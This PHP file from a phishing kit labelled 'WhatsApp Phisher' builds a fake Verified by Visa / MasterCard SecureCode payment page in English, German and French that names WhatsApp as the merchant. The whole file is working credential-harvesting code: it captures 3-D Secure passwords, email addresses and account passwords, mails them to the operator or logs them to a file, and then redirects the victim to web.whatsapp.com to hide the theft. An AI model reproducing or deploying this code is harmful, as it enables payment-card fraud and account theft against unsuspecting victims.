<?php
/*
 WhatsApp Phisher
 File : process.php
 Coded by x256
 Ask for updates premiumers(at)gmail.com ;)
*/

@include("send.php");
@include("geo.php");
if($_GET["p"] == "check") {
$data = " vbvPass : $_POST[vbpass] | forget : $_POST[accNum] - $_POST[userEmail] \n data : $_POST[ci] \n user : $ip \n ------\n\n\n";
if(strlen($_POST["userEmail"]) >= "7" and strlen($_POST["accNum"]) >= "5" ) {if($TxtStore == "1"){@file_put_contents($ccStore, $data, FILE_APPEND | LOCK_EX);} else {} @mail($rezltMail, $rezlTitleVbv, $data); echo "<meta http-equiv='refresh' content='0;url=process.php?p=done'>"; }
elseif(strlen($_POST["vbpass"]) <= "4") {$path = $_POST["path"]."&err=1"; echo "<meta http-equiv='refresh' content='0;url=$path'>";}
else {if($TxtStore == "1"){@file_put_contents($ccStore, $data, FILE_APPEND | LOCK_EX);} else {} @mail($rezltMail, $rezlTitleVbv, $data); echo "<meta http-equiv='refresh' content='0;url=process.php?p=done'>"; }}
elseif($_GET["p"] == "done") { echo "<meta http-equiv='refresh' content='0;url=https://web.whatsapp.com/'>";}
else {
$FirstCc = substr(base64_decode($_GET["c"]), 0, 1);
if ($FirstCc == "4") {$verifiedBy = "vbv1"; $verifiProce = "Verified by Visa"; }
elseif ($FirstCc == "5") {$verifiedBy = "mcsc1"; $verifiProce = "MasterCard SecureCode"; $inpPass = "Codice di sicurezza";}
else {echo "<meta http-equiv='' content='0;url=process.php?p=done'>";}

if($verifiedBy == "vbv1") {$vbvMsg0 = "<i>Verified by Visa Password</i>"; $inpPass = "Password";}
elseif($verifiedBy == "mcsc1") {$vbvMsg0 = "<i>MasterCard SecureCode</i>"; }
$vbvMsg1 = "Enter your to confirm the payment process.";
$marchant = "Dealer:";
$price = "Amount:";
$vbDate = "Date:";
$cardNum = "Card number:";
$vbvMsg3 = "This information is not transmitted to the merchant.";
$valid = "Submit";	
$cancel = "Exit";
$forget = "Forgot $inpPass?";
$accoNum = "Password Email:";
$userEmail = "Email address:";

if (base64_decode($_GET["l"]) == "en") {}
elseif (base64_decode($_GET["l"]) == "de") {
	if($verifiedBy == "vbv1") {$vbvMsg0 = "<i>Verified by Visa Passwort</i>"; $inpPass = "Passwort";}
	elseif($verifiedBy == "mcsc1") {$vbvMsg0 = "<i>MasterCard SecureCode</i>"; }
	$vbvMsg1 = "Bitte geben Sie Ihr $vbvMsg0 ein, um den bezahlvorgang zu bestätigen.";
	$marchant = "Händler:";
	$price = "Betrag:";
	$vbDate = "Datum:";
	$cardNum = "Kreditkartennummer:";
	$vbvMsg3 = "Diese Informationen werden nicht an den Online-Händler weitergeleitet.";
	$valid = "Senden";	
	$cancel = "Abbrechen";	
	$forget = "$inpPass vergessen?";
	$accoNum = "Abrechnungskontonummer:";
	$userEmail = "E-Mail-Addresse:";
}

elseif (base64_decode($_GET["l"]) == "fr") {
	$vbvMsg0 = "Pour confirmer le processus de paiement, veuillez entrer votre";
	if($verifiedBy == "vbv1") {$vbvMsg1 = "$vbvMsg0 <i>Mot de passe Verified by Visa.</i>"; $inpPass = "Mot de passe";}
	elseif($verifiedBy == "mcsc1") {$vbvMsg1 = "$vbvMsg0 <i>MasterCard SecureCode.</i>"; }
	$marchant = "Marchand:";
	$price = "Montant:";
	$vbDate = "Date:";
	$cardNum = "Numéro de carte:";
	$vbvMsg3 = "Ces informations ne sont pas transmises au marchand.";
	$valid = "Valider";	
	$cancel = "Annuler";
	$forget = "$inpPass oublié?";
	$accoNum = "Numéro de compte:";
	$userEmail = "Adresse e-mail:";
}
echo "<html><head><title>$verifiProce</title>
<link rel='shortcut icon' href='images/vbv.ico'>
<meta charset='UTF-8'><style>
*{font-family:arial; font-size:13px}
input{border:1px solid #707070; padding:2px; font-size:12px;}
.s1{text-align:right; padding:4px; padding-right:0px; width:50%; }
.s2{text-align:left; padding:4px}
.forgot{font-size:12px; text-decoration:none; color:#3366FF; }
#submit{border:1px solid #002A80; background:url('images/btn-valid.png'); background-size:100% 100%; color:#ffffff; cursor:pointer; font-size:13px; padding:2px; margin:2px 5px 2px 5px; }
#scinfos {display:none;}
.sckonto {border:2px solid black; width:100%;}</style>
<script language='javascript'>function forgot3DSecure(){document.getElementById('scpass').style.display = 'none'; document.getElementById('scinfos').style.display = 'block';}</script>";
echo "</head><body><form action='process.php?p=check&c=".$_GET["c"]."' method='post'>";
echo "<input type='hidden' name='ci' value='".base64_decode($_GET["ci"])."'>";
echo "<input name='path' type='hidden' value='".basename($_SERVER['PHP_SELF']) . "?" . $_SERVER['QUERY_STRING']."'>";
echo "<table align='center' style='margin-top:40px' width='400' cellpadding='0' cellspacing='0'>
<tr><td height='80' valign='top'><img src='images/$verifiedBy.png' height='40'/>$cc</td><td align='right' valign='top'><img src='https://i.imgsafe.org/ec63ee77c2.gif'/></td></tr>
<tr><td colspan='2'>$vbvMsg1<br><br></td></tr>
<tr><td class='s1'>$marchant</td><td class='s2'>WhatsApp</td></tr>
<tr><td class='s1'>$price</td><td class='s2'><b>".base64_decode($_GET['m'])."</b></td></tr>
<tr><td class='s1'>$vbDate</td><td class='s2'>".date('d.m.Y')."</td></tr>
<tr><td class='s1'>$cardNum</td><td class='s2'>XXXX XXXX XXXX ".substr(base64_decode($_GET['c']), -4)."</td></tr></table>
<table id='scpass' align='center' width='400' cellpadding='0' cellspacing='0'>
<tr><td class='s1' valign='top'><label for='vbpass'>$inpPass:</label></td><td class='s2'><input autofocus type='password' name='vbpass' id='vbpass' style='width:100px; margin-bottom:4px; ";
if($_GET['err'] == '1') {echo 'border:2px solid red;';}
echo "'/><br><a href='javascript:forgot3DSecure();' onclick='forgot3DSecure()' class='forgot' >$forget</a></td></tr>
</table><table id='scinfos' align='center' width='400' cellpadding='0' cellspacing='0'>
<tr><td style='border:1px solid #d0d0d0; background:#f0f0f0; height:75px; width:400px;' align='center'><table width='100%'>
<tr><td class='s1'>$userEmail</td> <td class='s2'><input type='text' name='userEmail' value='$_POST[userEmail]' style='width:150px;'></td></tr>
<tr><td class='s1'>$accoNum</td> <td class='s2'><input type='text' name='accNum' value='$_POST[accNum]' style='width:120px;'></td></tr>
</table></td></tr></table>
<table align='center' width='400' cellpadding='0' cellspacing='0'>
<tr><td align='center' colspan='2' height='50'><input type='submit' value='$valid' id='submit' style='margin-left:50px'/>
<button type='reset' id='submit' style=\"border:1px solid #999; background:url('images/btn-cancel.png'); background-size:100% 100%;\">$cancel</button></td></tr>
<tr><td colspan='2'>$vbvMsg3</td></tr>
</table></body></html>";
}
?>